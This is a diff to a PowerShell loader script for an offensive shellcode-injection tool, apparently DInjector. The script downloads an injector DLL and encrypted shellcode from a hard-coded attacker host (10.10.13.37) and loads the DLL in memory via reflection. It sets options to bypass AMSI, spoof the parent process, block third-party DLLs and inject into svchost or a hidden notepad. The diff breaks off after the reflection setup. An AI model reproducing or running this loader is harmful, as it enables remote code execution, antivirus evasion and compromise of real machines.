@@ -1,53 +1,56 @@
 # module name
-$M = "currentthread"
+$A = "currentthread"
 
-# attacker's host
-$H = "10.10.13.37"
+# lhost
+$B = "10.10.13.37"
 
-# bypass AMSI ("True" / "False")
-$A = "True"
+# lport
+$C = 80
 
 # injector filename
 $D = "DInjector.dll"
 
 # encrypted shellcode filename
-$S = "enc"
+$E = "enc"
 
 # password to decrypt the shellcode
-$W = "Passw0rd!"
+$F = "Passw0rd!"
 
 # path to the image of a newly spawned process to inject into (used in "remotethreadapc", "remotethreadcontext" and "processhollow")
-$I = "C:\Windows\System32\svchost.exe"
+$G = "C:\Windows\System32\svchost.exe"
 
 # existing process name to inject into (used in "remotethread" and "remotethreadsuspended")
-$P = "notepad"
+$H = "notepad"
 
 # parent process name to spoof the original value (use "0" to disable PPID spoofing)
-$PP = "explorer"
+$I = "explorer"
 
 # block 3rd-party DLLs ("True" / "False")
-$BD = "True"
+$J = "True"
+
+# bypass AMSI ("True" / "False")
+$K = "True"
 
 # --------------------------------------------------------------------
 
 $methods = @("remotethread", "remotethreadsuspended")
-if ($methods.Contains($M)) {
-    $P = (Start-Process -WindowStyle Hidden -PassThru $P).Id
+if ($methods.Contains($A)) {
+    $H = (Start-Process -WindowStyle Hidden -PassThru $H).Id
 }
 
 $methods = @("remotethreadapc", "remotethreadcontext", "processhollow")
-if ($methods.Contains($M)) {
+if ($methods.Contains($A)) {
     try {
-        $PP = (Get-Process $PP -ErrorAction Stop).Id
+        $I = (Get-Process $I -ErrorAction Stop).Id
     }
     catch {
-        $PP = 0
+        $I = 0
     }
 }
 
-$cmd = "$M /am51:$A /sc:http://$H/$S /password:$W /image:$I /pid:$P /ppid:$PP /blockDlls:$BD"
+$cmd = "${A} /sc:http://${B}:${C}/${E} /password:${F} /image:${G} /pid:${H} /ppid:${I} /blockDlls:${J} /am51:${K}"
 
-$data = (IWR -UseBasicParsing "http://$H/$D").Content
+$data = (IWR -UseBasicParsing "http://${B}:${C}/${D}").Content
 $assem = [System.Reflection.Assembly]::Load($data)
 
 $flags = [Reflection.BindingFlags] "NonPublic,Static"
